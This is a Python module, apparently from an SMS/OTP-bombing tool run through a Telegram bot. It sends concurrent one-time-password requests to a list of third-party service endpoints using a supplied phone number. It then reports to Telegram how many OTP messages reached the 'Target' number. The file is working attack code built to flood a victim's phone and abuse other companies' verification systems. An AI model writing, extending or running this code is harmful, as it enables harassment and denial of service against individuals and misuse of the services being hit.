# ─────────────────────────────────────────────────────────────
#  sender.py — Fire OTP requests to all endpoints (async)
# ─────────────────────────────────────────────────────────────

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field

import httpx

from endpoints import ENDPOINTS


@dataclass
class Result:
    """Outcome of a single OTP fire attempt."""
    name: str
    success: bool
    status: int = 0
    detail: str = ""


async def fire_one(client: httpx.AsyncClient, ep: dict, phone: str) -> Result:
    """Fire a single endpoint and return a Result."""
    url = ep["url"].replace("{phone}", phone)
    method = ep["method"]
    headers = dict(ep["headers"])

    try:
        if method == "GET":
            resp = await client.get(url, headers=headers, timeout=15)
        else:
            body_fn = ep["body"]
            payload = body_fn(phone) if callable(body_fn) else None

            if ep.get("form"):
                resp = await client.post(url, headers=headers, data=payload, timeout=15)
            else:
                resp = await client.post(url, headers=headers, json=payload, timeout=15)

        ok = 200 <= resp.status_code < 300
        detail = ""
        try:
            data = resp.json()
            # Try to extract a message from common response shapes
            detail = (
                data.get("message")
                or data.get("data", {}).get("message")
                or data.get("data", {}).get("msg")
                or data.get("statusMessage")
                or data.get("message_text")
                or str(resp.status_code)
            )
        except Exception:
            detail = str(resp.status_code)

        return Result(name=ep["name"], success=ok, status=resp.status_code, detail=str(detail))

    except httpx.TimeoutException:
        return Result(name=ep["name"], success=False, status=0, detail="⏱️ Timeout")
    except httpx.ConnectError:
        return Result(name=ep["name"], success=False, status=0, detail="🔌 Connection failed")
    except Exception as e:
        return Result(name=ep["name"], success=False, status=0, detail=str(e)[:80])


async def fire_all(phone: str, on_result=None) -> list[Result]:
    """
    Fire all endpoints concurrently.

    Args:
        phone:     10-digit mobile number string
        on_result: Optional async callback(result, index, total)

    Returns:
        List of Result objects
    """
    results: list[Result] = []

    async with httpx.AsyncClient(follow_redirects=True) as client:
        tasks = []
        for i, ep in enumerate(ENDPOINTS):
            tasks.append(_fire_and_report(client, ep, phone, i, len(ENDPOINTS), results, on_result))

        await asyncio.gather(*tasks)

    return results


async def _fire_and_report(client, ep, phone, idx, total, results, on_result):
    """Wrapper that fires one endpoint and invokes the callback."""
    result = await fire_one(client, ep, phone)
    results.append(result)
    if on_result:
        await on_result(result, idx, total)


def build_summary(results: list[Result], phone: str) -> str:
    """Build a rich Markdown summary for Telegram."""
    success = sum(1 for r in results if r.success)
    failed = len(results) - success

    lines = [
        "",
        "📊 *━━━━━ FINAL REPORT ━━━━━*",
        "",
        f"📱 *Target:* `{phone}`",
        f"✅ *Delivered:* {success}/{len(results)}",
        f"❌ *Failed:* {failed}/{len(results)}",
        "",
        "─── *Breakdown* ───",
        "",
    ]

    for r in results:
        if r.success:
            lines.append(f"  ✅ {r.name}  •  `{r.status}`")
        else:
            lines.append(f"  ❌ {r.name}  •  _{r.detail}_")

    lines.append("")
    lines.append("*━━━━━━━━━━━━━━━━━━━━━━━━━━━*")

    return "\n".join(lines)
